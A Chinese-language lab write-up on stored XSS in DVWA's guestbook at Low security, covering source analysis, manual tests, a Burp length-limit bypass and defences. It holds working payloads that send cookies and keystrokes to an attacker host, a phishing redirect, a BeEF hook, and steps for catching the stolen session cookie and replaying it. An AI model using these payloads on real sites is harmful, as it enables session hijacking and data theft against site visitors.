# DVWA XSS (Stored) Low 通关 WriteUp

## 一、漏洞概述

**存储型 XSS（Stored XSS）** 也叫持久型 XSS。它的特点是：恶意脚本被提交到服务器后**永久存储**（通常存入数据库），任何访问该页面的用户都会自动执行这段脚本。

与反射型 XSS 的区别：

| 对比项   | 反射型 XSS                 | 存储型 XSS                   |
| --- | --- | --- |
| 脚本存储 | 不存储，仅存在于一次响应中 | 存储在服务器/数据库中        |
| 触发方式 | 需要诱导受害者点击恶意链接 | 任何访问该页面的用户自动触发 |
| 影响范围 | 单个受害者                 | 所有访问者                   |
| 危害程度 | 中                         | 高                           |

DVWA 的 **XSS (Stored)** 模块是一个留言板功能，用户提交的留言会被保存到数据库并在页面展示。

将 DVWA 安全级别设置为 **Low**，进入 **XSS (Stored)** 模块。

## 二、源码分析

查看 Low 级别源码：

```php
<?php
if (isset($_POST['btnSign'])) {
    $message = trim($_POST['mtxMessage']);
    $name    = trim($_POST['txtName']);

    $message = stripslashes($message);
    $name    = stripslashes($name);

    $query = "INSERT INTO guestbook (comment, name) VALUES ('$message', '$name');";
    $result = mysqli_query($connection, $query);
}
?>
```

展示留言的代码：

```php
$query = "SELECT comment, name FROM guestbook;";
$result = mysqli_query($connection, $query);

while ($row = mysqli_fetch_assoc($result)) {
    echo "<div id='guestbook'>";
    echo "<h3>" . $row['name'] . "</h3>";
    echo "<p>" . $row['comment'] . "</p>";
    echo "</div>";
}
```

关键点：

1. 留言内容通过 **POST** 提交。
2. 输入仅经过 `trim()` 和 `stripslashes()` 处理，**没有任何 XSS 过滤**。
3. 输出时直接拼接 `$row['name']` 和 `$row['comment']`，未做 HTML 转义。
4. 留言会写入 `guestbook` 表，随后从数据库读出并展示，因此脚本会持久化。

## 三、手工测试流程

### 1\. 正常提交留言

在 Name 填入：

```text
test
```

在 Message 填入：

```text
hello world
```

提交后，页面显示：

```text
Name: test
Message: hello world
```

### 2\. 测试 HTML 注入

Name 填 `test`，Message 填：

```html
<b>bold</b>
```

提交后页面中 `bold` 显示为加粗，说明 HTML 标签被正常解析。

### 3\. 测试脚本执行

Name 填 `test`，Message 填：

```html
<script>alert('XSS')</script>
```

提交后页面立即弹窗，说明存储型 XSS 存在。

### 4\. 验证持久化

刷新页面或重新打开该模块，弹窗仍然会触发。说明脚本已经被写入数据库，每次访问都会执行。

### 5\. 在 Name 字段注入

Name 字段同样存在注入。提交：

```html
<script>alert(document.cookie)</script>
```

效果与 Message 字段一致。

> 注意：DVWA 的 Message 字段有长度限制（默认 50 字符），Name 字段限制更短。如果 Payload 较长，建议放在 Message 字段中，或者用 Burp Suite 改包绕过前端限制。

## 四、Burp Suite 改包绕过长度限制

由于前端 `maxlength` 限制，较长的 Payload 可能无法直接提交。可以用 Burp Suite 拦截请求并修改：

1. 正常填写内容并提交。
2. Burp 拦截到 POST 请求：
   ```http
    POST /dvwa/vulnerabilities/xss_s/ HTTP/1.1
    Host: 靶机IP
    Cookie: PHPSESSID=...; security=low
   
    txtName=test&mtxMessage=hello&btnSign=Sign+Guestbook
   ```
3. 将 `mtxMessage` 修改为完整 Payload：
   ```text
    mtxMessage=<script>new Image().src='http://192.168.1.10/steal?c='+document.cookie;</script>
   ```
4. 转发请求，Payload 成功写入数据库。

## 五、常用 Payload 与利用方式

### 1\. 基础弹窗

```html
<script>alert(1)</script>
```

### 2\. 窃取 Cookie

```html
<script>new Image().src='http://攻击者IP/steal?c='+document.cookie;</script>
```

### 3\. 图片事件触发

```html
<img src=x onerror=alert(document.cookie)>
```

### 4\. 页面跳转 / 钓鱼

```html
<script>window.location='http://攻击者IP/login.html';</script>
```

### 5\. 键盘记录（Keylogger）

```html
<script>
document.onkeypress = function(e) {
    new Image().src = 'http://攻击者IP/log?k=' + e.key;
}
</script>
```

### 6\. XSS 平台（BeEF 等）

实际渗透中，通常使用 BeEF 等 XSS 平台进行深度利用。注入：

```html
<script src="http://攻击者IP:3000/hook.js"></script>
```

BeEF 会对被控浏览器执行多种模块，例如：获取 Cookie、截屏、键盘记录、内网扫描等。

## 六、搭建接收端验证 Cookie 窃取

### 1\. 使用 Python 搭建简易 HTTP 服务

在攻击机执行：

```bash
python3 -m http.server 80
```

或者用更灵活的 `nc`：

```bash
nc -lvp 80
```

### 2\. 注入 Payload

在 DVWA 留言板提交：

```html
<script>new Image().src='http://攻击者IP/steal?c='+document.cookie;</script>
```

### 3\. 观察接收日志

当其他用户访问留言板时，攻击机终端会收到类似：

```text
GET /steal?c=PHPSESSID%3Dabc123...%3B%20security%3Dlow HTTP/1.1
```

将 `PHPSESSID` 替换到浏览器 Cookie 中，即可伪造受害者会话。

## 七、漏洞成因与防御

**成因**：

1. 用户输入未经过 XSS 过滤或转义，直接存入数据库。
2. 输出时未做 HTML 编码，浏览器将数据解析为 HTML/JavaScript 执行。
3. 恶意脚本被持久化存储，影响所有访问者。

**防御措施**：

1. **输出编码（核心）**  
   输出到 HTML 上下文时，使用 `htmlspecialchars()`：
   ```php
    echo htmlspecialchars($row['comment'], ENT_QUOTES, 'UTF-8');
   ```
2. **输入过滤**  
   使用白名单过滤，例如只允许字母、数字、中文和常见标点。避免使用黑名单方式（容易被绕过）。
3. **Cookie 设置 HttpOnly**  
   防止 JavaScript 读取会话 Cookie：
   ```php
    session_set_cookie_params(['httponly' => true]);
   ```
4. **内容安全策略（CSP）**  
   限制页面可执行的脚本来源：
   ```text
    Content-Security-Policy: default-src 'self'; script-src 'self'
   ```
5. **使用安全模板引擎**  
   现代模板引擎（如 Twig、Blade、Jinja2）默认对变量输出进行转义，避免手动拼接 HTML。
6. **富文本场景使用白名单过滤库**  
   如果业务允许用户提交 HTML（如论坛、CMS），应使用专门的 HTML 过滤库，例如：
   - PHP：`HTMLPurifier`
   - Python：`bleach`
   - Java：`jsoup`

    通过白名单仅保留安全标签与属性，剔除 `<script>`、`onerror` 等危险内容。

## 八、总结

存储型 XSS 是危害最高的 XSS 类型：

- 脚本存储在服务器上；
- 任何访问者都会自动执行；
- 可批量窃取 Cookie、发起钓鱼、执行键盘记录。

Low 级别完全没有过滤，是理解 XSS 原理的最佳起点。掌握它之后，再学习 Medium 的 `str_replace` 绕过和 High 的 `htmlspecialchars` 场景，就能形成完整的 XSS 攻防知识体系。